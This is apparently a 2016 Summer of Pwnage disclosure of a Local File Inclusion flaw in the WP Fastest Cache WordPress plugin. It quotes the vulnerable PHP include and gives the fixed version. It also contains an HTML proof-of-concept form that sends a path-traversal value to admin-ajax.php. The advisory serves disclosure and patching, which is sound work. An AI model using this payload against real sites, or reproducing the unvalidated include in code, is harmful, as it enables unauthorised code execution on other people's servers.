------------------------------------------------------------------------
WP Fastest Cache Member Local File Inclusion vulnerability
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
It was discovered that the WP Fastest Cache WordPress plugin is
vulnerable to Local File Inclusion. This issue can potentially be
exploited to run arbitrary PHP code. In order to do so, the attacker
must be able to place an arbitrary PHP file on the target system. The
malicious file must have the .php extension.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0022

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WP Fastest Cache WordPress Plugin
version 0.8.5.9.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in WP Fastest Cache version 0.8.6.0.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/wp_fastest_cache_member_local_file_inclusion_vulnerability.html

The issue exists in the file wpFastestCache.php and is caused by the lack of input validation on the id POST parameter. The vulnerable code is listed below.

public function wpfc_cdn_template_ajax_request_callback(){
   if(current_user_can('manage_options')){
      ob_start();
      include_once(WPFC_MAIN_PATH."templates/cdn/".$_POST["id"].".php");
      $content = ob_get_contents();
      ob_end_clean();
   
[...]

Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/admin-ajax.php" method="POST">
         <input type="hidden" name="action" value="wpfc_cdn_template_ajax_request" />
         <input type="hidden" name="id" value="../exclude" />
         <input type="submit" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
